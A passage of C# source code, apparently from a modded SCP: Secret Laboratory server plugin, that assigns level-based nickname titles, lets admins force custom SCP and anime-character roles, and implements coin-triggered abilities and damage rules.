					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re:0萌新]" + hub.nicknameSync.Network_myNickSync;

				}
				if (Lv >= 20 && Lv < 30)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re:0萌新]" + hub.nicknameSync.Network_myNickSync;

				}
				if (Lv >= 30 && Lv < 45)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re:0强者]" + hub.nicknameSync.Network_myNickSync;

				}
				if (Lv >= 45 && Lv < 50)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re:0强者]" + hub.nicknameSync.Network_myNickSync;

				}
				if (Lv >= 50 && Lv < 60)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re:0老玩家]" + hub.nicknameSync.Network_myNickSync;

				}
				if (Lv >= 60)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re0:荣誉玩家]" + hub.nicknameSync.Network_myNickSync;

				}
			}
				

		}
		public void OnVerified(VerifiedEventArgs ev)
		{
			Timing.RunCoroutine(delayVerified(ev));

		}
		public IEnumerator<float> delayVerified(VerifiedEventArgs ev)
		{
			yield return Timing.WaitForSeconds(0.1f);
			int exp = IniFile.ReadExp(ev.Player.UserId);
			setnick(ev.Player.ReferenceHub, exp);
			int Lv = IniFile.ReadLevel(exp);
			setnick(ev.Player.ReferenceHub);

			if (Lv >=10 && Lv< 20)
            {
				setnick(ev.Player.ReferenceHub);
            }
			if (Lv >= 20 && Lv < 30)
			{
				setnick(ev.Player.ReferenceHub);
			}
			if (Lv >= 30 && Lv < 45)
			{
				setnick(ev.Player.ReferenceHub);
			}
			if (Lv >= 45 && Lv < 50)
			{
				setnick(ev.Player.ReferenceHub);
			}
			if (Lv >= 50)
			{
				setnick(ev.Player.ReferenceHub);
			}
		}

		public void OnPlayerJoin(JoinedEventArgs ev)
		{
			
		}
		public void OnSendingRemoteAdminCommand(SendingRemoteAdminCommandEventArgs ev)
		{
			if(ev.Name == "force")
			{
				if(ev.Arguments.Count == 0)
				{
					ev.Sender.RemoteAdminMessage("你没填参数呀,目前可以填 九尾狐黑客 混沌迫击炮手 scp367 scp105 scp682 scp738 scp1143 七月 莱月昂 蕾姆 拉姆 爱蜜莉雅 幸运儿 SCP035 SCP3199 作死之王 亚伯 SCP999 鱼博士 寒冰 DIO 蛇皮手间谍 黑暗掌控者 SCP1038");
				}
				if(ev.Arguments.Count == 1)
				{
					switch(ev.Arguments[0])
					{
						case "混沌迫击炮手":
							if (zhgyes == false)
							{
								zhgid = ev.Sender.Id;
								ev.Sender.Broadcast(25, "<color=lime>你是指挥官</color>:\n丢弃硬币可以使用技能，只能使用一次，使用后地表\nSCP扣血1000人类50");
								Setrank_new("指挥官", "lime", ev.Sender);
								Timing.RunCoroutine(Hpnew2(ev.Sender, 190));
								ev.Sender.AddItem(ItemType.Coin);
								zhgyes = true;
							}
							break;
						case "scp367":
							scp367id.Add(ev.Sender.Id);
							ev.Sender.Role = RoleType.Scp93953;
							Setrank_new("SCP367", "red", ev.Sender);

							break;
						case "scp105":
							scp105 = ev.Sender;
							scp105id = scp105.Id;
							scp105.Broadcast(10, "<color=lime>你是SCP105</color>\n你拿手电时你周围的人无敌\n但是你会每秒掉3HP");
							Setrank_new("SCP105", "yellow", scp105);
							scp105.AddItem(ItemType.Flashlight);
							break;
						case "九尾狐黑客":
							jwhhk = ev.Sender;
							jwhhkid = jwhhk.Id;
							Setrank_new("九尾狐黑客", "red", jwhhk);
							jwhhk.Broadcast(5, "<color=lime>你是九尾狐黑客</color>:输入.hk可以黑入实验室");
							break;
						case "scp682":
							scp682 = ev.Sender;

							Setrank_new("SCP-682|等级1", "red", scp682);
							scp682id = scp682.Id;
							scp682lv = 1;
							scp682yes = true;
							Timing.RunCoroutine(Hpnew2(ev.Sender, 1000));
							break;
						case "scp1143":
							scp1143id = ev.Sender.Id;
							Timing.RunCoroutine(GiveItemSCP1143());
							break;
						case "scp738":
							scp738id = ev.Sender.Id;
							ev.Sender.Broadcast(10, "<color=lime>你是scp738</color>\n扔下硬币切换复制模式\n可以消耗血量复制东西");
							ev.Sender.AddItem(ItemType.Coin);
							break;
						case "蛇皮手间谍":
							蛇皮手间谍 = ev.Sender;
							蛇皮手id = 蛇皮手间谍.Id;
							蛇皮手间谍.ClearInventory();
							蛇皮手间谍.AddItem(ItemType.KeycardChaosInsurgency);
							蛇皮手间谍.AddItem(ItemType.Coin);
							蛇皮手间谍.AddItem(ItemType.Medkit);
							蛇皮手间谍.AddItem(ItemType.Painkillers);
							蛇皮手间谍.AddItem(ItemType.GunCOM15);
							ev.Sender.Broadcast(10, "<color=lime>[蛇皮手间谍]</color>\n<color=yello>人物介绍已发送 按~查看</color>\n<color=yellow></color>");
							ev.Sender.SendConsoleMessage("抗伤害为人类攻击一次掉3血", "lime");
							ev.Sender.SendConsoleMessage("同DD博士血量，血包一次加10血，止疼药一次加5血，肾上腺素加20血，500加33血，医疗物品仅可以加血无临时生命值和恢复生命值", "lime");
							ev.Sender.SendConsoleMessage("可以正常使用可乐/隐身帽/018（018对其无伤害），可以正常逃出变九尾/混沌", "lime");
							ev.Sender.SendConsoleMessage("特殊技能：蛇皮手支援（扔掉背包内硬币将刷新至多9名辅导人员，刷新于地面A电梯旁，290血，自带机枪/步枪/对讲机/红卡/血包，刷新时 间谍将显示头衔——蛇之手间谍，间谍与支援与SCP三者间无法互相伤害）", "lime");
							break;
						case "SCP1038":
							scp1038 = ev.Sender;
							scp1038id = ev.Sender.Id;
							scp1038.Health = 20;
							scp1038.ClearInventory();
							scp1038.AddItem(ItemType.SCP268);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);
							scp1038.AddItem(ItemType.Coin);

							ev.Sender.Broadcast(10, "<color=lime>[SCP1038]</color>\n<color=yello>HP:20</color>\n<color=yellow>丢下硬币可以隐身</color>");

							break;
						case "黑暗掌控者":
							黑暗掌控者 = ev.Sender;
							黑暗掌控者id = ev.Sender.Id;
							黑暗掌控者yes = true;
							Timing.RunCoroutine(HeiGive());
							Setrank_new("SCP134", "red", 黑暗掌控者);
							ev.Sender.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.Tutorial, true);
							ev.Sender.AddItem(ItemType.Coin);
							ev.Sender.Broadcast(10, "<color=lime>[SCP134]</color>\n<color=yello>SCP阵营</color>\n<color=yellow>丢下硬币可以让设施停电</color>");
							Timing.RunCoroutine(Tpnew(ev.Sender, RoleType.Scp173.GetRandomSpawnPoint()));
							break;
						case "寒冰":
							if (寒冰刷出 == false)
							{
								寒冰 = ev.Sender;
								寒冰刷出 = true;
								寒冰id = 寒冰.Id;
								Timing.RunCoroutine(HanBingZB());

							}
							break;
						case "鱼博士":
							if (鱼博士刷出 == false)
							{
								鱼博士刷出 = true;
								鱼博士 = ev.Sender;
								鱼博士id = 鱼博士.Id;
								Timing.RunCoroutine(YuBoShiZB());
							}
							break;
						case "七月":
							if (七月刷出 == false)
							{
								七月 = ev.Sender;
								七月id = 七月.Id;
								七月刷出 = true;
								Setrank_new("SCP-七月", "red", 七月);
								Map.Broadcast(10, "七月来圈钱了");
								Timing.RunCoroutine(QiYueZB());
							}
							break;
						case "蕾姆":
							if (蕾姆刷出 == false)
							{
								蕾姆 = ev.Sender;
								蕾姆id = 蕾姆.Id;
								蕾姆刷出 = true;
								Setrank_new("蕾姆", "cyan", 蕾姆);
								Timing.RunCoroutine(LeiMuZB());
							}
							break;
						case "拉姆":
							if (拉姆刷出 == false)
							{
								拉姆 = ev.Sender;
								拉姆id = 拉姆.Id;
								拉姆刷出 = true;
								Setrank_new("蕾姆", "cyan", 拉姆);
								Timing.RunCoroutine(LeiMuZB());
							}
							break;
						case "莱月昂":
							莱月昂 = ev.Sender;
							莱月昂id = 莱月昂.Id;
							莱月昂刷出 = true;
							莱月昂坐标 = 莱月昂.Position;
							莱月昂.Health = 250;
							莱月昂.AddItem(ItemType.KeycardFacilityManager);
							莱月昂.AddItem(ItemType.SCP268);
							莱月昂.AddItem(ItemType.SCP500);
							莱月昂.AddItem(ItemType.Coin);
							莱月昂.AddItem(ItemType.Coin);
							莱月昂.AddItem(ItemType.Coin);
							Setrank_new("莱月昂", "nickel", ev.Sender);
							break;
						case "爱蜜莉雅":
							if (爱蜜莉雅刷出 == false)
							{
								爱蜜莉雅刷出 = true;
								爱蜜莉雅 = ev.Sender;
								爱蜜莉雅id = 爱蜜莉雅.Id;
								Timing.RunCoroutine(AiMiLiYaZB());
							}
							break;
						case "幸运儿":
							幸运儿 = ev.Sender;
							幸运儿id = 幸运儿.Id;
							int card = new System.Random().Next(1, 10);
							switch (card)
							{
								case 1:
									幸运儿.AddItem(ItemType.KeycardChaosInsurgency);
									card = 0;
									break;
								case 2:
									幸运儿.AddItem(ItemType.KeycardContainmentEngineer);
									card = 0;
									break;
								case 3:
									幸运儿.AddItem(ItemType.KeycardJanitor);
									card = 0;
									break;
								case 4:
									幸运儿.AddItem(ItemType.KeycardScientistMajor);
									card = 0;
									break;
								case 5:
									幸运儿.AddItem(ItemType.KeycardNTFCommander);
									card = 0;
									break;
								case 6:
									幸运儿.AddItem(ItemType.KeycardNTFLieutenant);
									card = 0;
									break;
								case 7:
									幸运儿.AddItem(ItemType.KeycardO5);
									card = 0;
									break;
								case 8:
									幸运儿.AddItem(ItemType.KeycardScientist);
									card = 0;
									break;
								case 9:
									幸运儿.AddItem(ItemType.KeycardZoneManager);
									card = 0;
									break;
								default:
									幸运儿.AddItem(ItemType.KeycardZoneManager);
									card = 0;
									break;
							}
							Setrank_new("SCP-181", "pink", ev.Sender);
							break;
						case "SCP035":
							scp035id = ev.Sender.Id;
							break;
						case "SCP3199":
							scp3199id = ev.Sender.Id;
							ev.Sender.ReferenceHub.playerEffectsController.EnableEffect<CustomPlayerEffects.Visuals939>(10000, true);

							Setrank_new("SCP3199", "lime", ev.Sender);

							break;
						case "作死之王":
							作死之王 = ev.Sender;
							作死之王id = ev.Sender.Id;
							ev.Sender.Broadcast(10, "你是SCP1790");
							Setrank_new("SCP1790", "red", ev.Sender);

							ev.Sender.AddItem(ItemType.SCP207);
							ev.Sender.AddItem(ItemType.SCP207);
							ev.Sender.AddItem(ItemType.SCP207);
							ev.Sender.AddItem(ItemType.SCP207);
							Coroutines.Add(Timing.RunCoroutine(ZuoSiGive()));

							ev.Sender.RankColor = "red";
							break;
						case "亚伯":
							亚伯 = ev.Sender;
							亚伯id = ev.Sender.Id;
							亚伯.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.ChaosInsurgency, true);
							Timing.RunCoroutine(Tpnew(亚伯, RoleType.ChaosInsurgency.GetRandomSpawnPoint()));
							亚伯.AddItem(ItemType.GunUSP);
							亚伯.AddItem(ItemType.KeycardNTFCommander);
							亚伯.Broadcast(10, "你是SCP550\n拥吸血能力 但相应的血量偏低 scp阵营 使用p90杀敌可吸收其血量");
							亚伯.Ammo[0] = 400;
							亚伯.Ammo[1] = 400;
							亚伯.Ammo[2] = 400;

							Setrank_new("SCP550", "red", ev.Sender);

							break;
						case "SCP999":
							scp999id = ev.Sender.Id;
							Setrank_new("SCP999", "pink", ev.Sender);
							ev.Sender.Broadcast(10, "<color=lime>[SCP999]</color>\n<color=yello>你是SCP999:你攻击别人可以给别人回血</color>\n<color=yellow>中立可选择帮助任意阵营</color>");
							Timing.RunCoroutine(SCP999zb(ev.Sender));
							break;
						case "DIO":
							Dio = ev.Sender;
							Dioid = ev.Sender.Id;
							Timing.RunCoroutine(DioZB());
							break;

					}
				}
			}
			
		}
		private IEnumerator<float> JLSC()
		{
			yield return Timing.WaitForSeconds(1f);

			foreach (Player player in Player.List)
			{
				if(player.Role == RoleType.Spectator)
				{
					精灵 = player;
					精灵id = 精灵.Id;
					精灵.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.NtfCadet, true);
					精灵.AddItem(ItemType.KeycardO5);
					精灵.AddItem(ItemType.MicroHID);
					Setrank_new("精灵", "silver", 精灵);
					精灵.ReferenceHub.playerMovementSync.OverridePosition(爱蜜莉雅.Position, 0, false);
					break;
				}
			}
		}
		private IEnumerator<float> LeiMuLaMuJiNeng(Player player)
		{
			player.Health = 555;
			player.AddItem(ItemType.SCP207);
			yield return Timing.WaitForSeconds(300f);
			蕾姆拉姆技能 = false;
			player.Kill();
			player.Role = RoleType.Spectator;
		}
		private IEnumerator<float> SJTZ()
		{
			while(sjtz)
			{
				yield return Timing.WaitForSeconds(0.1f);
				foreach (Player player in Player.List)
				{
					if(player.Id != Dioid)
					{
						player.Position = player.Position;

					}
				}
			}

		}
		private IEnumerator<float> SJTZ2()
		{
			yield return Timing.WaitForSeconds(9f);
			sjtz = false;
		}
		private IEnumerator<float> Tpnew(Player player,Vector3 vector3)
		{
			yield return Timing.WaitForSeconds(3f);
			player.Position = vector3;
		}
		public void OnDropItem(DroppingItemEventArgs ev)
		{
			if(ev.Player.Id == zhgid)
            {
				if(ev.Item.id == ItemType.Coin)
                {
					Map.Broadcast(25, "<color=red>[Warning]</color>\n混沌火炮来袭");
					foreach(Player player in Player.List)
                    {
						if(player.Position.y >=974 && player.Position.y <=1033)
                        {
							if(player.Team == Team.SCP)
                            {
								player.Health -= 1000;
                            }
                            else
                            {
								player.Health -= 50;
                            }
                        }
                    }
                }
				ev.Player.Kill(DamageTypes.Nuke);
            }
			if(ev.Player.Id == scp738id)
            {
				if(ev.Item.id == ItemType.Coin)
                {
					if(scp738fuzhi)
                    {
						scp738fuzhi = false;
						ev.Player.ShowHint("已关闭复制模式");
					}
                    else
                    {
						scp738fuzhi = true;
						ev.Player.ShowHint("已开启复制模式");
					}
					ev.IsAllowed = false;
				}
            }
			if(ev.Player.Id == 黑暗掌控者id)
			{
				if(ev.Item.id == ItemType.Coin)
				{
					Map.TurnOffAllLights(10);
					ev.IsAllowed = false;
					ev.Player.RemoveItem(ev.Item);
				}
			}
			if(ev.Player.Id == scp1038id)
			{
				if(ev.Item.id == ItemType.Coin)
				{
					scp1038.ReferenceHub.playerEffectsController.EnableEffect<CustomPlayerEffects.Scp268>(2000, true);
					ev.IsAllowed = false;
					ev.Player.RemoveItem(ev.Item);
				}

			}
			if (ev.Player.Id == Dioid)
			{
				if(ev.Item.id == ItemType.Coin)
				{
					ev.IsAllowed = false;
					ev.Player.RemoveItem(ev.Item);
					sjtz = true;
					Map.Broadcast(9, "DIO发动时间停止");
					Timing.RunCoroutine(SJTZ());
					Timing.RunCoroutine(SJTZ2());

				}
			}
			if(ev.Player.Id == 蛇皮手id)
			{
				if(ev.Item.id == ItemType.Coin)
				{
					int time = 0;
					if(蛇之手召唤 == false)
					{
						蛇之手召唤 = true;
						foreach(Player player in Player.List)
						{
							if(player.Role == RoleType.Spectator && player.Id != scp682id)
							{
								蛇之手id.Add(player.Id);
								time++;
								player.Role = RoleType.Tutorial;
								player.AddItem(ItemType.GunLogicer);
								player.AddItem(ItemType.GunE11SR);
								player.AddItem(ItemType.Radio);
								player.AddItem(ItemType.Medkit);
								player.AddItem(ItemType.KeycardContainmentEngineer);
								Setrank_new("蛇之手", "yellow", player);
								Timing.RunCoroutine(Tpnew(player, RoleType.ChaosInsurgency.GetRandomSpawnPoint()));
								if(time >= 8)
								{
									break;
								}
							}

						}
					}
				}
			}
			if(ev.Player.Id == 莱月昂id)
			{
				if(ev.Item.id == ItemType.Coin)
				{
					ev.Player.Broadcast(4, "存档成功");
					ev.IsAllowed = false;
					ev.Player.RemoveItem(ev.Item);
					莱月昂坐标 = ev.Player.Position;
					莱月昂装备.Clear();
					foreach (Inventory.SyncItemInfo syncItemInfo in ev.Player.Inventory.items)
					{
						莱月昂装备.Add(syncItemInfo);
					}
					莱月昂角色 = ev.Player.Role;
				}
			}
			if(ev.Player.Id == 爱蜜莉雅id)
			{
				if(精灵id == 0)
				{
					if (ev.Item.id == ItemType.Coin)
					{
						Timing.RunCoroutine(JLSC());
					}
				}
			}
			if(ev.Player.Id == 拉姆id || ev.Player.Id == 蕾姆id)
			{
				if(ev.Item.id == ItemType.Coin)
				{
					蕾姆拉姆技能 = true;
					Timing.RunCoroutine(LeiMuLaMuJiNeng(ev.Player));
				}
			}
			if(ev.Player.Id == 七月id)
			{
				
				if(ev.Item.id == ItemType.Coin)
				{
					bool coinyes = false;
					foreach(Inventory.SyncItemInfo syncItemInfo in ev.Player.Inventory.items)
					{
						if(syncItemInfo.id == ItemType.Coin)
						{
							coinyes = true;

						}
					}
					if(coinyes)
					{
						ev.Player.ClearBroadcasts();
						ev.Player.Broadcast(15, "成功发起技能\n获得15s无敌和伤害翻倍");
						Timing.RunCoroutine(QiYueCD());
						七月技能发动 = true;
					}
					else
					{
						int luck = new System.Random().Next(1, 3);
						switch(luck)
						{
							case 1:
								ev.Player.Broadcast(10, "没钱了");
								ev.Player.Kill();
								七月 = null;
								七月id = 0;
								七月刷出 = false;
								七月技能发动 = false;
								break;
							case 2:
								ev.Player.Broadcast(10, "打钱");
								ev.Player.AddItem(ItemType.Coin);
								ev.Player.AddItem(ItemType.Coin);
								break;
							default:
								ev.Player.Broadcast(10, "打钱");
								ev.Player.AddItem(ItemType.Coin);
								ev.Player.AddItem(ItemType.Coin);
								break;
						}
					}
					ev.IsAllowed = false;
					ev.Player.RemoveItem(ev.Item);
				}
			}
		}
		private IEnumerator<float> Hpnew(Player player,int health)
		{
			yield return Timing.WaitForSeconds(3f);
			player.Health = health;
		}
		private IEnumerator<float> Hpnew2(Player player, int health)
		{
			yield return Timing.WaitForSeconds(5f);
			player.Health = health;
		}
		public void OnPlayerSpawn(SpawningEventArgs ev)
		{
			if(ev.Player.Role == RoleType.Scp173)
			{
				Timing.RunCoroutine(Hpnew(ev.Player, 7500));
			}
			if (ev.Player.Role == RoleType.Scp93953)
			{
				Timing.RunCoroutine(Hpnew(ev.Player, 3000));
			}
			if (ev.Player.Role == RoleType.Scp93989)
			{
				Timing.RunCoroutine(Hpnew(ev.Player, 3000));

			}
			if (ev.Player.Role == RoleType.Scp106)
			{
				Timing.RunCoroutine(Hpnew(ev.Player, 1000));
			}
			if (ev.Player.Role == RoleType.Scp0492)
			{
				Timing.RunCoroutine(Hpnew(ev.Player, 350));
			}
			if (ev.Player.Role == RoleType.Scp049)
			{
				Timing.RunCoroutine(Hpnew(ev.Player, 4000));

			}
			if (ev.Player.Role == RoleType.Scp096)
			{
				Timing.RunCoroutine(Hpnew(ev.Player, 600));
			}
			if(ev.Player.Team != Team.SCP)
            {
				Timing.RunCoroutine(Hpnew(ev.Player, 120));

			}
		}
		public void Onmeddikusing(UsingMedicalItemEventArgs ev)
		{
			if (ev.Player.Id == 蛇皮手id)
			{
				ev.IsAllowed = false;

				if (ev.Item == ItemType.Medkit)
				{
					ev.Player.RemoveItem(ev.Player.CurrentItem);
					ev.Player.Health += 10;
				}
				if (ev.Item == ItemType.Painkillers)
				{
					ev.Player.RemoveItem(ev.Player.CurrentItem);
					ev.Player.Health += 5;
				}
				if (ev.Item == ItemType.SCP500)
				{
					ev.Player.RemoveItem(ev.Player.CurrentItem);
					ev.Player.Health += 33;
				}
			}
		}
		public void OnPlayerHurt(HurtingEventArgs ev)
		{
			if (scp105flash)
			{
				if (Vector3.Distance(ev.Target.Position, scp105.Position) <= 5 && ev.Target.Team != Team.SCP && ev.Target.Id !=scp105id)
				{
					ev.Amount = 0;
					ev.IsAllowed = false;
				}
			}
			if(ev.IsAllowed)
            {
				if(scp367id.Contains(ev.Attacker.Id)&& !scp008id.Contains(ev.Target.Id) && ev.Target.Id != scp035id && ev.Target.Id !=亚伯id && ev.Target.Id != 黑暗掌控者id)
                {
					ev.Amount = 20;
					if(ev.Target.Health <=20)
                    {
						scp367id.Add(ev.Target.Id);
						Timing.RunCoroutine(Tpnew(ev.Target, ev.Target.Position));

						ev.Target.Role = RoleType.Scp93953;
						Timing.RunCoroutine(Hpnew(ev.Target, 2000));
						ev.Target.RankColor = "red";
						ev.Target.RankName = "SCP-367";
					}
                }

				if (scp008id.Contains(ev.Target.Id) && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure)
				{
					if (ev.Attacker.Team == Team.SCP)
					{
						ev.Attacker.ShowHint("他是008请勿攻击", 1);
						ev.Amount = 0;
					}
					if (ev.Attacker.Role == RoleType.Scp049)
					{
						ev.Amount = 10;
					}

				}
				if (scp008id.Contains(ev.Attacker.Id) && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure)
				{
					if (ev.Target.Team != Team.SCP)
					{
						ev.Amount = ev.Amount / 10 * 4;
					}
					if (ev.Target.Team == Team.SCP)
					{
						ev.Amount = 0;
					}
				}
				if (ev.Target.Id != 亚伯id&&ev.Target.Id != scp035id && ev.Target.Id != 黑暗掌控者id&&!scp008id.Contains(ev.Target.Id) && ev.Attacker.Role == RoleType.Scp049 && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure)
				{
					if (new System.Random().Next(1, 100) > 65)
					{
						ev.Amount = 0;
						ev.Target.Health = ev.Target.MaxHealth;
						scp008id.Add(ev.Target.Id);
						ev.Target.RankName = "SCP-008";
						ev.Target.RankColor = "green";
						ev.Target.ShowHint("你是SCP-008\n冲进人堆感染他们", 5);
					}

				}
				if (ev.Target.Role == RoleType.ClassD && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure)
				{
					if (ev.Attacker.Team != Team.SCP)
					{
						if (ev.Target.IsCuffed)
						{
							ev.Amount = 0;
						}
					}

				}
				if (ev.Target.Id == 黑暗掌控者id && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure)
				{
					if (ev.Attacker.Team == Team.SCP)
					{
						ev.Amount = 0;
					}
				}
				if (ev.Attacker.Id == 黑暗掌控者id && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure)
				{
					if (ev.Target.Team == Team.SCP)
					{
						ev.Amount = 0;
					}
				}
				if (ev.Attacker.Id == scp1038id)
				{
					ev.Amount = ev.Amount - 10;
				}
				if (ev.Attacker.Team == Team.SCP && ev.Target.Id == scp457id)
				{
					ev.Amount = 0f;
				}
				if (ev.Attacker.Id == scp457id && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker.Role == RoleType.Tutorial && ev.Target.Id != scp457id)
				{
					ev.Amount = 0f;
				}
				if (ev.Target.Id == hdjjsid)
				{
					ev.Amount += ev.Amount;
				}
				float 默认伤害 = ev.Amount;
				if (ev.Attacker.Id == 蛇皮手id)
				{
					if (蛇之手id.Contains(ev.Target.Id))
					{
						ev.Amount = 0;
					}
					if (ev.Target.Team == Team.SCP)
					{
						ev.Amount = 0;
					}
					if (ev.Target.Id == 亚伯id)
					{
						ev.Amount = 0;
					}
				}
				if (蛇之手id.Contains(ev.Attacker.Id))
				{
					if (蛇之手id.Contains(ev.Target.Id))
					{
						ev.Amount = 0;
					}
					if (ev.Target.Team == Team.SCP)
					{
						ev.Amount = 0;
					}
					if (ev.Target.Id == 蛇皮手id)
					{
						ev.Amount = 0;
					}
					if(ev.Target.Id == 亚伯id)
                    {
						ev.Amount = 0;
                    }
				}
				if ((ev.Attacker.Id == 蛇皮手id || 蛇之手id.Contains(ev.Attacker.Id)) && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker != null)
				{
					if (ev.Target.Team == Team.SCP || ev.Target.Id == 蛇皮手id || 蛇之手id.Contains(ev.Target.Id))
					{
						ev.Amount = 0;
					}
					if (ev.Target.Team != Team.SCP)
					{
						ev.Amount = 默认伤害;
					}
					if (ev.Target.Id == scp035id)
					{
						ev.Amount = 0;
					}
				}
				if (ev.Attacker.Team == Team.SCP)
				{
					if (ev.Target.Id == 蛇皮手id || 蛇之手id.Contains(ev.Target.Id))
					{
						ev.Amount = 0;
					}
				}
				if (ev.Attacker.Id == 鱼博士id)
				{
					if (ev.Target.Role == RoleType.Scp93953 || ev.Target.Role == RoleType.Scp93989)
					{
						ev.Amount += 60;
					}
				}
				if (七月技能发动)
				{
					if (ev.Target.Id == 七月id)
					{
						ev.Amount = 0;
					}
					if (ev.Attacker.Id == 七月id)
					{
						ev.Amount += ev.Amount;
					}
				}
				if (ev.Target.Id == scp999id && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker != null)
				{
					if (ev.Attacker.Team == Team.SCP)
					{
						ev.Amount = 50;
					}
				}

				if (ev.DamageType != DamageTypes.Tesla && ev.DamageType != DamageTypes.Decont && ev.DamageType != DamageTypes.Falldown && ev.DamageType != DamageTypes.Flying && ev.DamageType != DamageTypes.Nuke && ev.DamageType != DamageTypes.Pocket && ev.DamageType != DamageTypes.Wall && ev.DamageType != DamageTypes.Lure && ev.Attacker != null)
				{
					if (ev.Target.Id == scp682id)
					{
						if (scp682lv == 1)
						{
							ev.Amount -= 2;
						}
						if (scp682lv == 2)
						{
							ev.Amount -= 4;
						}
						if (scp682lv == 3)
						{
							ev.Amount -= 10;
						}
					}
					if (ev.Target.Id == 幸运儿id)
					{
						int luck = new System.Random().Next(1, 101);
						if (luck <= 50)
						{
							ev.Amount = 0;
						}
					}
					if (ev.Attacker.Id == scp682id)
					{
						if (scp682lv == 1)
						{
							ev.Amount = 60;
						}
						if (scp682lv == 2)
						{
							ev.Amount = 100;
						}
						if (scp682lv == 3)
						{
							ev.Amount = 400;
						}

					}
					if (ev.Target.Id == Dioid)
					{
						if(ev.Attacker.Team != Team.SCP)
                        {
							ev.Amount= ev.Amount / 10 * 6;
                        }
					}
					if (sjtz)
					{
						if (ev.Attacker.Id != Dioid)
						{
							ev.Amount = 0;
						}
					}
					if(ev.Target.Id == Dioid)
                    {
						if(ev.Attacker.Team != Team.SCP)
                        {
							ev.Amount = 20;
                        }
                    }
					if (ev.Target.Id == 寒冰id)
					{
						ev.Amount -= 10;
					}
					if (莱月昂之怒)
					{
						if (ev.Attacker.Id == 莱月昂id)
						{
							ev.Amount += ev.Amount;
						}
					}
					if (ev.Target.Id == 张大仙id)
					{
						if (ev.DamageType == DamageTypes.Scp173)
						{
							ev.Amount = 0;
						}
					}
					if (ev.Target.Id == 七月id)
					{
						if (ev.Attacker.Team == Team.SCP)
						{
							ev.Amount = 50;
						}
						else
						{
							ev.Amount = 20;
						}
					}

					if (ev.Attacker.Id == scp2818id && ev.Attacker.Id != scp999id && ev.DamageType ==DamageTypes.Usp)
					{
						ev.Amount = 700;
						ev.Attacker.Health -= 1000;
						if (ev.Attacker.Health <= 0)
						{
							ev.Attacker.Kill(DamageTypes.Nuke);
						}

					}
					if (ev.Attacker.Team != Team.SCP)
					{
						if (ev.Target.Id == 蕾姆id)
						{
							ev.Amount = 20;
						}
						if (ev.Target.Id == 拉姆id)
						{
							ev.Amount = 20;
						}
					}
					if (ev.Target.Id == 蕾姆id)
					{
						if (蕾姆之怒)
						{
							ev.Amount = 0;
						}
					}
					if (ev.Target.Id == 拉姆id)
					{
						if (拉姆之怒)
						{
							ev.Amount = 0;
						}
					}
					if (ev.Attacker.Id == 蕾姆id || ev.Attacker.Id == 拉姆id)
					{
						if (蕾姆拉姆技能)
						{
							ev.Amount += ev.Amount;
						}
					}

				}
				if (roundstart)
				{
